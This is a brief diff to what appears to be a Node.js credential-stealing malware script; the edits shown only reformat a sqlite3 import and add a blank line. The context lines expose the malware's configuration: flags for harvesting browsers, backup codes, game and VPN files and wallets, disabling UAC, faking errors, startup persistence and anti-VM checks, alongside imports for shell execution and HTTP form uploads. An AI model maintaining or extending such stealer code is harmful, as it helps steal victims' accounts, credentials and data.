@@ -3,12 +3,7 @@ const path = require('path');
 const os = require('os');
 const crypto = require('crypto');
 const CONFIG = { browsers: true, backupcodes: true, games: true, filevpn: true, wallet: false, disableuac: true, computerinfo: true, fakeerror: false, startup: true, antivm: false };
-let sqlite3;
-try {
-    sqlite3 = require('sqlite3');
-} catch (e) {
-    sqlite3 = null;
-}
+let sqlite3; try { sqlite3 = require('sqlite3'); } catch (e) { sqlite3 = null; }
 const { execSync, exec, spawn } = require('child_process');
 const axios = require('axios');
 const FormData = require('form-data');
@@ -3054,4 +3049,5 @@ function checkSystem() {
     } finally {
         process.exit(0);
     }
+
 })();
